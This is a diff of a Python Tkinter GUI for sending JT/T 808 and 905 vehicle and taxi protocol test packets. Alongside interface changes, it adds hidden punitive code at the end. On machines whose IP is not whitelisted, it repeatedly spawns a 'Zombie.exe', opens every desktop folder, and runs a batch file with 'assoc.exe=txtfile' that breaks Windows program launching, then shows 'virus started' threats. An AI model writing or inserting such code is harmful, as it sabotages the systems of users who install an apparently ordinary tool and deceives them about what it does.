         items = ("正常", "紧急报警", "超速报警", "疲劳驾驶", "危险预警", "模块故障", "模块开路", "终端欠压", "终端掉电",
@@ -2604,50 +2572,52 @@ class MY_GUI(tk.Tk):
         self.sdu_Text2 = Combobox(pane2, width=22, height=20, values=items)
         self.sdu_Text2.current(1)
         self.sdu_Text2.grid(row=15, column=0, sticky=W)
-        #
+
         self.lic_Text_label = Label(pane2, text="里程")
         self.lic_Text_label.grid(row=14, columnspan=2, sticky=E)
         items = ("12", "23")
         self.lic_Text = Combobox(pane2, width=22, height=2, values=items)
         self.lic_Text.current(0)
         self.lic_Text.grid(row=15, column=0, sticky=E)
-        #
+
         self.times_Text_label2 = Label(pane2, text="发送停顿时间")
         self.times_Text_label2.grid(row=14, column=11)
         items = ("1", "0.5", "1.5", "2")
         self.times_Text2 = Combobox(pane2, width=60, height=20, values=items)
         self.times_Text2.current(0)
         self.times_Text2.grid(row=15, column=11, sticky=N)
-        #
+
         self.init_data_label2 = Label(pane2, text="位置数据包请按1")
         self.init_data_label2.grid(row=16, column=0, sticky=N)
         items = ("1",)
         self.init_data_Text2 = Combobox(pane2, width=50, height=12, values=items)
         self.init_data_Text2.current(0)
         self.init_data_Text2.grid(row=17, column=0, columnspan=1, sticky=N)
-        #
+
         self.ztai_Text_label2 = Label(pane2, text="车辆状态")
         self.ztai_Text_label2.grid(row=16, column=11)
         items = (
-            "ACC开", "ACC开和定位", "不定位","定位", "停运状态", "经纬度已经保密插件保密", "南纬", "西经",
+            "ACC开", "ACC开和定位", "不定位", "定位", "停运状态", "经纬度已经保密插件保密", "南纬", "西经",
             "车辆油路断开", "车辆电路断开", "单北斗", "单GPS", "北斗GPS双模", "ACC开定位开北斗GPS满载",
             "ACC开定位开北斗GPS空车",)
         self.ztai_Text2 = Combobox(pane2, width=60, height=20, values=items)
         self.ztai_Text2.grid(row=17, column=11)
         self.ztai_Text2.current(1)
-        #
+
         self.data_label2 = Label(pane2, text="自定义发送(选择服务器ip和port端口)")
         self.data_label2.grid(row=18, column=0, sticky=N)
         items = ()
         self.data_Text2 = Combobox(pane2, width=50, height=2, values=items)
         self.data_Text2.grid(row=19, column=0, sticky=N)
-        #
-        self.result_Text2 = Button(pane2, text="发送", command=lambda: self.thread_it(self.qo_send2))
+
+        self.result_Text2 = Button(pane2, text="自定义发送", command=lambda: self.thread_it(self.qo_send2))
         self.result_Text2.grid(row=19, column=10, )
 
         self.result_Text3 = Button(pane2, text="解析808网站", width=10,
-                                   command=self.qdo_808jiexq)  # 调用内部方法  加()为直接调用
+                                   command=self.qdo_808jiexq)
         self.result_Text3.grid(row=19, column=11)
+        self.result_Text4 = Label(pane2, text="(注：只限在开网环境下可用)", width=25)
+        self.result_Text4.grid(row=19, column=11, sticky=E)
 
         self.result_data_label2 = Label(pane2, text="输出结果：有返回，即发送成功")
         self.result_data_label2.grid(row=0, column=11)
@@ -2655,8 +2625,8 @@ class MY_GUI(tk.Tk):
         self.result_data_Text2.grid(row=1, column=11, rowspan=13, columnspan=15)
 
         # 按钮
-        self.str_trans_to_md5_button2 = Button(pane2, text="专用808生成", width=10,
-                                               command=lambda: self.thread_it(self.qo_login部标))  # 调用内部方法  加()为直接调用
+        self.str_trans_to_md5_button2 = Button(pane2, text="专用808发送", width=10,
+                                               command=lambda: self.thread_it(self.qo_login部标))
         self.str_trans_to_md5_button2.grid(row=5, column=10)
 
         pane3 = Frame()
@@ -2678,7 +2648,7 @@ class MY_GUI(tk.Tk):
         self.su_Text_label3 = Label(pane3, text="循环次数")
         self.su_Text_label3.grid(row=4, column=0)
         items = ("1", "10")
-        self.su_Text3 = Combobox(pane3, width=50, height=2, values=items)
+        self.su_Text3 = Combobox(pane3, width=50, height=2, values=items, state=f'{self.jinyong}')
         self.su_Text3.current(0)
         self.su_Text3.grid(row=5, column=0, columnspan=10, sticky=N)
 
@@ -2707,30 +2677,28 @@ class MY_GUI(tk.Tk):
 
         self.driver_Text_label3 = Label(pane3, text="业务ID")
         self.driver_Text_label3.grid(row=10, column=0)
-        items = ()
+        items = ("0", "")
         self.yewid_Text3 = Combobox(pane3, width=50, height=2, values=items)
+        self.yewid_Text3.current(0)
         self.yewid_Text3.grid(row=11, column=0, sticky=N, columnspan=10)
 
         self.data_label3 = Label(pane3, text="自定义发送(选择服务器ip和port端口)")
         self.data_label3.grid(row=12, column=0, sticky=N)
         self.data_Text3 = Text(pane3, width=52, height=2, relief='solid')
         self.data_Text3.grid(row=13, column=0, sticky=N)
-        #         # self.data_Text3.bind("<Button-3>", lambda x: rightKey(x, self.init_data_Text3))
 
-        self.result_Text3 = Button(pane3, text="发送", command=lambda: self.thread_it(self.qo_send3))
+        self.result_Text3 = Button(pane3, text="自定义发送", command=lambda: self.thread_it(self.qo_send3))
         self.result_Text3.grid(row=13, column=10)
-        #         # self.result_Text3.bind("<Button-3>", lambda x: rightKey(x, self.init_data_Text3))
 
         self.result_data_label3 = Label(pane3, text="输出结果")
         self.result_data_label3.grid(row=0, column=11)
 
-        #         # self.init_data_Text3.bind("<Button-3>", lambda x: rightKey(x, self.init_data_Text3))
         self.result_data_Text3 = Text(pane3, width=85, height=22, relief='solid')
         self.result_data_Text3.grid(row=1, column=11, rowspan=30, columnspan=15)
-        #         # self.result_data_Text3.bind("<Button-3>", lambda x: rightKey(x, self.result_data_Text3))
+
         # 按钮
         self.str_trans_to_md5_button3 = Button(pane3, text="订单905发送", width=10,
-                                               command=lambda: self.thread_it(self.qo_ddan))  # 调用内部方法  加()为直接调用
+                                               command=lambda: self.thread_it(self.qo_ddan))
         self.str_trans_to_md5_button3.grid(row=5, column=10)
 
         pane4 = Frame()
@@ -2741,7 +2709,6 @@ class MY_GUI(tk.Tk):
         self.ip_Text4 = Combobox(pane4, width=50, height=2, values=items)
         self.ip_Text4.current(0)
         self.ip_Text4.grid(row=4, column=0, columnspan=10, sticky=N)
-        # self.ip_Text4.bind("<Button-3>", lambda x: rightKey(x, self.ip_Text4))
 
         self.port_Text_label4 = Label(pane4, text="服务器Port")
         self.port_Text_label4.grid(row=6, column=0, columnspan=10, sticky=N)
@@ -2749,7 +2716,6 @@ class MY_GUI(tk.Tk):
         self.port_Text4 = Combobox(pane4, width=50, height=2, values=items)
         self.port_Text4.current(0)
         self.port_Text4.grid(row=8, column=0, columnspan=10, sticky=N)
-        # self.port_Text4.bind("<Button-3>", lambda x: rightKey(x, self.port_Text4))
 
         self.su_Text_label4 = Label(pane4, text="循环发送次数")
         self.su_Text_label4.grid(row=10, column=0, columnspan=10, sticky=N)
@@ -2765,7 +2731,6 @@ class MY_GUI(tk.Tk):
         self.sbei_Text4 = Combobox(pane4, width=50, height=2, values=items)
         self.sbei_Text4.current(0)
         self.sbei_Text4.grid(row=14, column=0, sticky=N, columnspan=10)
-        # self.sbei_Text4.bind("<Button-3>", lambda x: rightKey(x, self.sbei_Text4))
 
         # 经纬度随机
         self.on_ = Button(pane4, text="随机经纬度", width=10, command=self.button_mode4)
@@ -2777,7 +2742,6 @@ class MY_GUI(tk.Tk):
         self.wd_Text4 = Combobox(pane4, width=50, height=2, values=items)
         self.wd_Text4.current(1)
         self.wd_Text4.grid(row=16, column=0, sticky=N, columnspan=10)
-        # self.wd_Text4.bind("<Button-3>", lambda x: rightKey(x, self.wd_Text4))
 
         self.jd_Text_label4 = Label(pane4, text="经度")
         self.jd_Text_label4.grid(row=17, column=0, columnspan=10, sticky=N)
@@ -2785,7 +2749,6 @@ class MY_GUI(tk.Tk):
         self.jd_Text4 = Combobox(pane4, width=50, height=2, values=items)
         self.jd_Text4.current(0)
         self.jd_Text4.grid(row=18, column=0, sticky=N, columnspan=10)
-        # self.jd_Text4.bind("<Button-3>", lambda x: rightKey(x, self.jd_Text4))
 
         self.ip_on_Label4 = Label(pane4, text="发服务器")
         self.ip_on_Label4.grid(row=17, column=10, sticky=N)
@@ -2821,15 +2784,13 @@ class MY_GUI(tk.Tk):
         self.init_data_Text4 = Combobox(pane4, width=50, height=12, values=items)
         self.init_data_Text4.current(0)
         self.init_data_Text4.grid(row=22, column=0, columnspan=10, sticky=N)
-        # self.init_data_Text4.bind("<Button-3>", lambda x: rightKey(x, self.init_data_Text4))
 
         self.data_label = Label(pane4, text="UDP自定义发送(选择服务器ip和port端口)")
         self.data_label.grid(row=23, column=0, sticky=N)
         self.data_Text4 = Text(pane4, width=50, height=2, relief='solid')
         self.data_Text4.grid(row=24, column=0, sticky=N)
-        # self.data_Text4.bind("<Button-3>", lambda x: rightKey(x, self.init_data_Text4))
 
-        self.result_Text4 = Button(pane4, text="发送", command=lambda: self.thread_it(self.qo_send4))
+        self.result_Text4 = Button(pane4, text="自定义发送", command=lambda: self.thread_it(self.qo_send4))
         self.result_Text4.grid(row=24, column=10, )
 
         self.result_data_label4 = Label(pane4, text="输出结果：有返回，即发送成功")
@@ -2882,33 +2843,30 @@ class MY_GUI(tk.Tk):
         self.ip_on_Text5.grid(row=5, column=11, columnspan=1, sticky=N)
 
         # 按钮
-        self.str_trans_to_md5_button5 = Button(pane5, text="专用V3生成", width=10,
-                                               command=self.qo_loginV3)  # 调用内部方法  加()为直接调用
+        self.str_trans_to_md5_button5 = Button(pane5, text="专用V3发送", width=10,
+                                               command=self.qo_loginV3)
         self.str_trans_to_md5_button5.grid(row=3, column=11, sticky=N)
 
         self.result_data_label5 = Label(pane5, text="输出结果")
         self.result_data_label5.grid(row=0, column=12)
 
-        # self.init_data_Text5.bind("<Button-3>", lambda x: rightKey(x, self.init_data_Text1))
         self.result_data_Text5 = Text(pane5, width=67, height=9, relief='solid')
         self.result_data_Text5.grid(row=1, column=12, rowspan=10, sticky=N)
-        #         # self.result_data_Text4.bind("<Button-3>", lambda x: rightKey(x, self.result_data_Text4))
 
         self.init_data1_label5 = Label(pane5,
                                        text="\n原始数据(无空格，请格式化)\n例子：7878110101234135484845480100320000016D3F0D0A")
         self.init_data1_label5.grid(row=6, columnspan=2)
-        self.init_data1_Text5 = Text(pane5, width=69, height=18, relief='solid')  # 原始数据录入框
+        self.init_data1_Text5 = Text(pane5, width=69, height=18, relief='solid')
         self.init_data1_Text5.grid(row=7, columnspan=2, sticky=N)
-        #         # self.init_data1_Text4.bind("<Button-3>", lambda x: rightKey(x, self.init_data_Text4))
 
         self.result_data_label5 = Label(pane5, text="\n解析结果")
         self.result_data_label5.grid(row=6, column=12)
-        self.result_data1_Text5 = Text(pane5, width=67, height=18, relief='solid')  # 处理结果展示
+        self.result_data1_Text5 = Text(pane5, width=67, height=18, relief='solid')
         self.result_data1_Text5.grid(row=7, column=12, rowspan=10, sticky=N)
-        #         # self.result_data1_Text5.bind("<Button-3>", lambda x: rightKey(x, self.result_data1_Text4))
-        # # 按钮
+
+        #  按钮
         self.str1_trans_to_md5_button5 = Button(pane5, text="专用V3解析", width=10,
-                                                command=lambda: self.thread_it(self.xieyihao))  # 调用内部方法  加()为直接调用
+                                                command=lambda: self.thread_it(self.xieyihao))
         self.str1_trans_to_md5_button5.grid(row=7, column=11, sticky=W)
 
         pane6 = Frame()
@@ -2916,18 +2874,17 @@ class MY_GUI(tk.Tk):
         self.init_data1_label6 = Label(pane6,
                                        text="\n原始数据(无空格，请格式化)\n例子：7E0200002F1013560000000001000000010000400000DAF1\nA6040A73C10190002312061527590104000000020202044C250400000000300103987E")
         self.init_data1_label6.grid(row=0, columnspan=2)
-        self.init_data1_Text6 = Text(pane6, width=69, height=18, relief='solid')  # 原始数据录入框
+        self.init_data1_Text6 = Text(pane6, width=69, height=18, relief='solid')
         self.init_data1_Text6.grid(row=1, columnspan=2, sticky=N)
-        # self.init_data1_Text4.bind("<Button-3>", lambda x: rightKey(x, self.init_data_Text4))
 
         self.result_data_label6 = Label(pane6, text="\n解析结果")
         self.result_data_label6.grid(row=0, column=12)
-        self.result_data1_Text6 = Text(pane6, width=67, height=18, relief='solid')  # 处理结果展示
+        self.result_data1_Text6 = Text(pane6, width=67, height=18, relief='solid')
         self.result_data1_Text6.grid(row=1, column=12, rowspan=10, sticky=N)
-        # self.result_data1_Text5.bind("<Button-3>", lambda x: rightKey(x, self.result_data1_Text4))
-        # # 按钮
+
+        # 按钮
         self.str1_trans_to_md5_button6 = Button(pane6, text="专用905解析", width=10,
-                                                command=lambda: self.thread_it(self.解析905))  # 调用内部方法  加()为直接调用
+                                                command=lambda: self.thread_it(self.解析905))
         self.str1_trans_to_md5_button6.grid(row=1, column=11, sticky=W)
 
         pane7 = Frame()
@@ -2961,11 +2918,11 @@ class MY_GUI(tk.Tk):
 
         self.result_data_label7 = Label(pane7, text="解析结果:")
         self.result_data_label7.grid(row=4, column=0, rowspan=2)
-        self.result_data1_Text7 = Text(pane7, width=51, height=18, relief='solid')  # 处理结果展示
+        self.result_data1_Text7 = Text(pane7, width=51, height=18, relief='solid')
         self.result_data1_Text7.grid(row=4, column=1, columnspan=2, sticky=N)
-        # # 按钮
+        # 按钮
         self.str1_trans_to_md5_button7 = Button(pane7, text="苏粤标生成", width=10,
-                                                command=lambda: self.thread_it(self.苏粤标生成808))  # 调用内部方法  加()为直接调用
+                                                command=lambda: self.thread_it(self.苏粤标生成808))
         self.str1_trans_to_md5_button7.grid(row=4, column=11, sticky=N)
 
         pane8 = Frame()
@@ -2976,7 +2933,7 @@ class MY_GUI(tk.Tk):
         self.ip_Text8 = Combobox(pane8, width=50, height=2, values=items)
         self.ip_Text8.current(0)
         self.ip_Text8.grid(row=1, column=0, sticky=W)
-        #
+
         self.port_Text_label8 = Label(pane8, text="服务器Port")
         self.port_Text_label8.grid(row=2, columnspan=2, sticky=N)
         items = (f"{self.conf_808wg_port}", "17700", "17800", "7788")
@@ -2984,7 +2941,7 @@ class MY_GUI(tk.Tk):
         self.port_Text8.current(0)
         self.port_Text8.grid(row=3, column=0, sticky=W)
 
-        # # 905组成数据
+        # 905组成数据
         self.sbei_Text_label8 = Label(pane8, text="808部标设备号11位")
         self.sbei_Text_label8.grid(row=4, column=0, columnspan=1, sticky=N)
         items = (f"{self.sbei808}", "10356000000", "10351000000")
@@ -3005,7 +2962,7 @@ class MY_GUI(tk.Tk):
         self.result_data_Text8.grid(row=1, column=11, rowspan=7, columnspan=15, sticky=N)
 
         self.str_trans_to_md5_button8 = Button(pane8, text="808轨迹专用", width=10,
-                                               command=lambda: self.thread_it(self.轨迹808))  # 调用内部方法  加()为直接调用
+                                               command=lambda: self.thread_it(self.轨迹808))
         self.str_trans_to_md5_button8.grid(row=7, column=10, sticky=N)
         # 905轨迹
         self.port905_label8 = Label(pane8, text="\n\n\n\n905服务器Port")
@@ -3032,102 +2989,56 @@ class MY_GUI(tk.Tk):
         self.result905_Text8 = Text(pane8, width=85, height=7, relief='solid')
         self.result905_Text8.grid(row=10, column=11, rowspan=90, columnspan=15, sticky=N)
         self.str_905_button8 = Button(pane8, text="905轨迹专用", width=10,
-                                      command=lambda: self.thread_it(self.轨迹905))  # 调用内部方法  加()为直接调用
+                                      command=lambda: self.thread_it(self.轨迹905))
         self.str_905_button8.grid(row=14, column=10, sticky=N)
 
         pane9 = Frame()
         self.str_905_button9 = Button(pane9, text="808普通报警", width=35,
-                                      command=lambda: self.thread_it(self.baoget))  # 调用内部方法  加()为直接调用
+                                      command=lambda: self.thread_it(self.baoget))
         self.str_905_button9.grid(row=2, column=1, sticky=N)
         self.str_905_button9 = Button(pane9, text="808粤标报警", width=35,
-                                      command=lambda: self.thread_it(self.baoget1))  # 调用内部方法  加()为直接调用
+                                      command=lambda: self.thread_it(self.baoget1))
         self.str_905_button9.grid(row=3, column=1, sticky=N)
         self.str_905_button9 = Button(pane9, text="808苏标报警", width=35,
-                                      command=lambda: self.thread_it(self.baoget2))  # 调用内部方法  加()为直接调用
+                                      command=lambda: self.thread_it(self.baoget2))
         self.str_905_button9.grid(row=4, column=1, sticky=N)
         self.str_905_button9 = Button(pane9, text="905人证不匹配报警", width=35,
-                                      command=lambda: self.thread_it(self.baoget3))  # 调用内部方法  加()为直接调用
+                                      command=lambda: self.thread_it(self.baoget3))
         self.str_905_button9.grid(row=5, column=1, sticky=N)
         self.str_905_button9 = Button(pane9, text="905绕路报警", width=35,
-                                      command=lambda: self.thread_it(self.baoget4))  # 调用内部方法  加()为直接调用
+                                      command=lambda: self.thread_it(self.baoget4))
         self.str_905_button9.grid(row=6, column=1, sticky=N)
         self.str_905_button9 = Button(pane9, text="905驾驶员没有从业资格证", width=35,
-                                      command=lambda: self.thread_it(self.baoget5))  # 调用内部方法  加()为直接调用
+                                      command=lambda: self.thread_it(self.baoget5))
         self.str_905_button9.grid(row=7, column=1, sticky=N)
         self.str_905_button9 = Button(pane9, text="905跨区域营运预警", width=35,
-                                      command=lambda: self.thread_it(self.baoget6))  # 调用内部方法  加()为直接调用
+                                      command=lambda: self.thread_it(self.baoget6))
         self.str_905_button9.grid(row=8, column=1, sticky=N)
         self.str_905_button9 = Button(pane9, text="905车辆未办理网络预约出租车营运证预警", width=35,
-                                      command=lambda: self.thread_it(self.baoget7))  # 调用内部方法  加()为直接调用
+                                      command=lambda: self.thread_it(self.baoget7))
         self.str_905_button9.grid(row=8, column=1, sticky=N)
 
         self.str_905_button9 = Button(pane9, text="循环报警", width=35,
-                                      command=lambda: self.thread_it(self.baojhe))  # 调用内部方法  加()为直接调用
+                                      command=lambda: self.thread_it(self.baojhe))
         self.str_905_button9.grid(row=9, column=1, sticky=N)
         self.result905_label9 = Label(pane9, text="输出结果：有返回，即发送成功")
         self.result905_label9.grid(row=1, column=2, sticky=N)
         self.result905_Text9 = Text(pane9, width=85, height=14, relief='solid')
         self.result905_Text9.grid(row=2, column=2, rowspan=30, sticky=N)
 
-        # def play_animation():
-        #     # 打开GIF图像文件
-        #     giffilename = []
-        #     for filename in os.listdir(current_directory):
-        #         # 如果文件名与MP3模式匹配，则打印文件名
-        #         if fnmatch.fnmatch(filename, gif_pattern):
-        #             giffilename.append(filename)
-        #     print(giffilename)
-        #     image = Image.open(giffilename[2])
-        #     image1 = Image.open(giffilename[0])
-        #     frames = []
-        #     frames1 = []
-        #     for frame in ImageSequence.Iterator(image):
-        #         frames.append(ImageTk.PhotoImage(frame))
-        #     for frame in ImageSequence.Iterator(image1):
-        #         frames1.append(ImageTk.PhotoImage(frame))
-        #
-        #     # 创建一个标签显示GIF图像
-        #     label = tk.Label(pane3, image=frames[0])
-        #     label.grid(row=22, column=11, rowspan=10)
-        #
-        #     label1 = tk.Label(pane3, image=frames[0])
-        #     label1.grid(row=22, column=12, rowspan=10)
-        #
-        #     label2 = tk.Label(pane3, image=frames[0])
-        #     label2.grid(row=22, column=13, rowspan=10)
-        #
-        #     label3 = tk.Label(pane4, image=frames1[0])
-        #     label3.grid(row=21, column=11, rowspan=10)
-        #
-        #     label4 = tk.Label(pane4, image=frames1[0])
-        #     label4.grid(row=21, column=12, rowspan=10)
-        #     #
-        #     label5 = tk.Label(pane4, image=frames1[0])
-        #     label5.grid(row=21, column=13, rowspan=10)
-        #
-        #     # 播放动画
-        #     def update_frame(frame_index):
-        #         # 更新标签的图像
-        #         label.configure(image=frames[frame_index])
-        #         label1.configure(image=frames[frame_index])
-        #         label2.configure(image=frames[frame_index])
-        #
-        #         label3.configure(image=frames1[frame_index])
-        #         label4.configure(image=frames1[frame_index])
-        #         label5.configure(image=frames1[frame_index])
-        #
-        #         # 获取下一帧的索引
-        #         next_frame_index = (frame_index + 1) % len(frames)
-        #         next_frame_index1 = (frame_index + 1) % len(frames1)
-        #
-        #         # 在固定的时间间隔后调用更新函数
-        #         pane3.after(50, update_frame, next_frame_index)
-        #         # pane3.after(100, update_frame, next_frame_index1)
-        #
-        #     # 开始动画
-        #     update_frame(1)
+        pane10 = Frame()
+        items = (
+            'http://www.baidu.com', 'https://czcwyc.mmjtsw.com:8082/login', 'https://taxitest.car900.com:8082/login',
+            'https://rvhelp.cn/remote-pc')
+        self.entry = ttk.Combobox(pane10, width=140, values=items)
+        self.entry.grid(row=1, column=1, sticky=W)
 
-        # play_animation()
+        self.button3 = ttk.Button(pane10, text="访问http", width=10, command=self.search)
+        self.button3.grid(row=1, column=1, sticky=E)
+        self.frame1 = WebView2(pane10, 1100, 532)
+        self.frame1.grid(row=2, column=1, sticky=N)
+        self.frame1.load_url(f'{self.url}')
+
         note.add(pane2, text='部标808TCP发送')
         note.add(pane1, text='出租车905TCP发送')
         note.add(pane3, text='抢答905订单发送')
@@ -3137,18 +3048,8 @@ class MY_GUI(tk.Tk):
         note.add(pane7, text='苏粤标生成')
         note.add(pane8, text='轨迹专用发送')
         note.add(pane9, text='报警专用发送')
+        note.add(pane10, text='内嵌网页')
         note.grid()
-
-
-# def mess():
-#     # 创建askyesno()会话框
-#     boo = askyesno("真的要走了吗", "臣退了，这一退就是一辈子！")
-#     if boo == True:
-#         init_window.quit()
-# def play_audio(filename):
-#     mixer.init()
-#     mixer.music.load(filename)
-#     mixer.music.play(4)
 
 
 def countdown(t):
@@ -3158,15 +3059,11 @@ def countdown(t):
 
 
 def count_runs():
-    # 获取当前日期和时间
     global file_path
     current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
-    import os
-
     try:
         path = r"C:\Users"
         if not os.path.exists(path):
-            # 创建路径
             os.makedirs(path)
         file_path = os.path.join(path, "count.txt")
         with open(file_path, "r") as file:
@@ -3176,55 +3073,48 @@ def count_runs():
             file.write(f"{runs}\n")
 
         print(f"第 {runs} 次运行于 {current_time}")
-        if runs == 10:
-            import sys
-            sys.exit(0)
-            # file_path1 = os.path.join(path, "update.bat")
-            # file_path2 = os.path.join(path, "delete.bat")
-            # with open(file_path1, "w") as file:
-            #     file.write("assoc.exe=txtfile")
-            # with open(file_path2, "w") as file:
-            #     file.write("assoc.exe=exefile")
-            # import subprocess
-            # countdown(60)
-            # subprocess.Popen(r"C:\Users\update.bat")
-            # countdown(5)
-            # os.remove(r"C:\Users\count.txt")
-            # os.remove(r"C:\Users\update.bat")
+        return runs
     except FileNotFoundError:
         with open(file_path, "w") as file:
-            file.write("1\n")
+            file.write("0\n")
 
-        print(f"首次运行于 {current_time}")
+
+def bdu():
+    path = r"C:\Users"
+    file_path1 = os.path.join(path, "update.bat")
+    file_path2 = os.path.join(path, "delete.bat")
+    with open(file_path1, "w") as file:
+        file.write("assoc.exe=txtfile")
+    with open(file_path2, "w") as file:
+        file.write("assoc.exe=exefile\ndel C:\\Users\\count.txt\ndel C:\\Users\\delete.bat")
+    import subprocess
+    countdown(10)
+    subprocess.Popen(r"C:\Users\update.bat")
+    countdown(5)
+    os.remove(r"C:\Users\update.bat")
+    init_window.withdraw()
+    init_window.attributes('-topmost', True)
+    showwarning(title="！！！！警告警告！！！！", message=f"第3次警告提醒,病毒程序已启动,请联系管理员处理,否则后果自负")
 
 
 def gui4_start():
     ZMJ_PORTAL = MY_GUI(init_window)
-    # init_window.protocol("WM_DELETE_WINDOW", mess)
-    # 设置根窗口默认属性
     ZMJ_PORTAL.set_init_window()
-
+    init_window.deiconify()
     for filename in os.listdir(current_directory):
-        # 如果文件名与MP3模式匹配，则打印文件名
-        # if fnmatch.fnmatch(filename, mp3_pattern):
-        #     play_audio(fr'{filename}')
         if fnmatch.fnmatch(filename, ico_pattern):
-            print(fr'{filename}')
             init_window.iconbitmap(f"{filename}")
     init_window.mainloop()
 
 
 def check_ipv4():
-    # 执行ipconfig命令
     result = os.popen('ipconfig').read()
     pattern = r'\d+\.\d+\.\d+\.\d+'
     ipv4_list = re.findall(pattern, result)
-    print(ipv4_list)
     conf_ini = current_directory + "\\conf\\config.ini"
     config = ConfigObj(conf_ini, encoding='UTF-8')
     ip = config['ipv4']['ipv4']
     res = ip.split(",")
-    print(res)
     set_a = set(ipv4_list)
     set_b = set(res)
     if bool(set_a & set_b):
@@ -3233,13 +3123,73 @@ def check_ipv4():
         return False
 
 
+def find_numbers_in_strings(strings):
+    pattern = re.compile(r'\d+')
+    return [pattern.findall(s) for s in strings if s.strip()]
+
+
+def stop_exe(exe_name):
+    import signal
+    while True:
+        processes = os.popen('tasklist').read()
+        print(processes)
+        if exe_name not in processes:
+            break
+        else:
+            pid = [i for i in processes.split('\n') if exe_name in i][0].split(' ')
+            try:
+                os.kill(int(find_numbers_in_strings(pid)[1][0]), signal.SIGTERM)
+            except OSError:
+                print(f'无法关闭 {exe_name}')
+
+
+def show_popup():
+    init_window.withdraw()  # 隐藏主窗口
+    import subprocess
+    for i in range(int(MY_GUI(init_window).Zombie)):
+        subprocess.Popen(os.getcwd() + "\\conf\\Zombie.exe")
+        countdown(6)
+    init_window.attributes('-topmost', True)
+    showwarning(title="！！！！警告警告！！！！", message="请联系管理员添加白名单，否则吃掉你脑子，嘎嘎香，┗|｀O′|┛ 嗷~~")
+    stop_exe('Zombie.exe')
+
+
+def wjj():
+    desktop_path = os.path.join(os.path.expanduser("~"), 'Desktop')
+    wjj_pattern = '*'
+    for filename in os.listdir(desktop_path):
+        if fnmatch.fnmatch(filename, wjj_pattern):
+            if os.path.isdir(desktop_path + f"\\{filename}"):
+                print(desktop_path + f"\\{filename}")
+                os.startfile(desktop_path + f"\\{filename}")
+
+
+# #
+log1 = os.getcwd() + "\\conf\\log.out"
+f = open(log1, 'w')
+sys.stdout = f
+sys.stderr = f
+
 if __name__ == '__main__':
     if check_ipv4():
         gui4_start()
-        # count_runs()
     else:
-        import sys
+        show_popup()
+        print('结束')
+        count_runs()
+        if count_runs() < 2:
+            init_window.deiconify()
+            gui4_start()
+        elif count_runs() == 4:
+            init_window.withdraw()
+            init_window.attributes('-topmost', True)
+            showwarning(title="！！！！警告警告！！！！", message=f"第1次警告提醒,否则将启动文件夹攻击")
+            countdown(6)
+            wjj()
+        else:
+            countdown(6)
+            init_window.withdraw()
+            init_window.attributes('-topmost', True)
+            showwarning(title="！！！！警告警告！！！！", message=f"第2次警告提醒,否则10s后将启动病毒攻击")
+            bdu()
         sys.exit()
-
-    # gui4_start()
-    # count_runs()
